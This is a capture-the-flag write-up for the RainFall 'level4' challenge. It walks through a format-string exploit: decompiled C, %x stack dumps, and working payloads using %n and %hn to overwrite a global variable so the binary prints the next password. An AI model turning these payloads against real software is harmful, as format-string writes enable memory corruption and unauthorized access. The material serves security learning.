# level4

### First analysis

This exercice is probably going to be way more straightforward. It is almost the complete same as the past exercise, with some slight changes. Let's review them:

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

So as we can see there are 2 major changes from level3:
- printf is now in a different function than where fgets is called. For now I don't see how it cound make a difference and how it could have stopped us from exploiting level3 but we will probably find a reason to that.
- m now has to be equal to an address instead of an int. Normally in C, pointers (addresses) are int *, so it isn't that much of a change compared from level3, however if we transform the hex value in decimal 0x1025544 = 16930116. We easily understand that it is going to be hard to store a value of 16930116 using the same method as level3.

Also we can notice that we won't have a shell this time but just the password printed.

First thing, let's find the address of m and analyze the stack.

m address (using same methods as in level3) is 0x08049810.

Now for the stack:

```sh
level4@RainFall:~$ echo $(python -c "print('AAAABBBB ' + '%x ' * 25)") > /tmp/payload
level4@RainFall:~$ cat /tmp/payload - | /home/user/level4/level4
AAAABBBB b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 41414141 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```
As far as we know, what we are probably searching for is the beginning of the buffer, and maybe the content in between to manipulate an address or something (?), so we are gonna just analyze what is before the buffer that starts with the "41414141 42424242", the rest is just the "%x " in hexadecimal code. So as we can see the stack is slithly different this time, we have:
- 3 addresses probably from the stack or close (stack starts at bfffe000 so the addresses starting by b7 are more strange)
- 2 null values
- 3 more addresses, 2 from the stack and 1 from the code section probably.
- The buffer size, 200 in hex, 512 in decimal.
- 2 addresses from the stack or close.
- The buffer itself.

The format looks the same at the end, which makes sense, printf is still used, it is just called in another function, that's why we can find an address from the code section, probably the return address of p() to n(), and more saved frame pointer, old values of EBP etc (values starting by 0xb) that is necessary for the stack to work properly.

The first idea to try which may be stupid, is to write 16930116 chars long buffer so %n print this number into m, which would be interpreted as an address by the stack, this address being 0x1025544, the address of m.

Obviously the buffer is 512 chars long maximum (in fgets) but it is not a problem since we can use the synthax of printf to do that. The %08x format allows us to say "even if the %x is 200 at this address, print it with 8 chars, so 00000200". By adding longer padding requests to printf, we could reach this huge number. With simply %8x, it would print spaces instead of 0. (easier to print for a terminal).

```sh
level4@RainFall:~$ echo $(python -c "print('\x10\x98\x04\x08' + '%x ' * 4 + '%8x ' + '%x ' * 6)") > /tmp/payload
level4@RainFall:~$ cat /tmp/payload - | /home/user/level4/level4
b7ff26b0 bffff764 b7fd0ff4 0        0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0
```

Here we crafted a little payload with the address of m at the beginning, '%x ' * 4, to print 4 addresses, stopping to one of the two "0" values, so it is easier to calculate padding on it, we print this 0 value with %8x, as you can see the presence of spaces. And finally we print again "%x " * 6, where we find the last address before the buffer storage space. Meaning the stack pointer for printf is now pointer directly in the address of m, We just have to add a "%n" at the end, and the result will be written in m. Let's check if it works:

```sh
level4@RainFall:~$ echo $(python -c "print('\x10\x98\x04\x08' + '%x ' * 4 + '%8x ' + '%x ' * 6 + '%n')") > /tmp/payload
level4@RainFall:~$ cat /tmp/payload - | /home/user/level4/level4
b7ff26b0 bffff764 b7fd0ff4 0        0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 
^C
level4@RainFall:~$ 
```

First thing, when adding %n, the program doesn't crash, which means it finds an address that it can access, and can writes in. That's a good news, the program would segfault if it wasn't working. Let's continue.

```sh
0x08048456 in n ()
(gdb) p m
$1 = 90

# change the buffer

0x08048456 in p ()
(gdb) p m
$1 = 182
```

When checking the value of m with different payloads in gdb with the history function, we can see that m changes according to our payload size. Another good news. 

Now let's try to input 16.930.116 characters inside of it.

```sh
level4@RainFall:~$ echo $(python -c "print('\x10\x98\x04\x08' + '%x ' * 4 + '%16930034x ' + '%x ' * 6 + '%n')") > /tmp/payload
level4@RainFall:~$ cat /tmp/payload - | /home/user/level4/level4

[...] # After 16 millions spaces

0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

I honestly thought the terminal would crash but apparently printing spaces really isn't much for a terminal. We got almost instantly the flag !

We could have optimized that by writing in the high bytes (the 4 firts ones) and the lower bytes after, which would reduce considerably 

### Optimization

Even if it worked, we can easily imagine that in a old or slow machine this would have taken way more time, maybe too much for certains machine. It is a very hypothetical scenario even more nowadays so let's say it's more an excuse to go deeper into it and find how we could have done it without printing almost 17 millions characters.

For that we made a way lighter payload that is printing approcimately 22k characters instead of 16.9 millions.

This is the payload, for more explanation on it (involves maths and is quite hard to understand) you can check Resources/explanation.md

```sh
level4@RainFall:~$ echo $(python -c "print('\x12\x98\x04\x08' + 'AAAA' +'\x10\x98\x04\x08' + '%x' * 10 + '%186x' + '%hn' + '%21570x' + '%hn')") > /tmp/payload
level4@RainFall:~$ cat /tmp/payload - | /home/user/level4/level4
AAAAb7ff26b0bffff764b7fd0ff400bffff728804848dbffff520200b7fd1ac0

[...]  # After 20k spaces

41414141
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Important doc

[Exploiting FSV](https://axcheron.github.io/exploit-101-format-strings/)
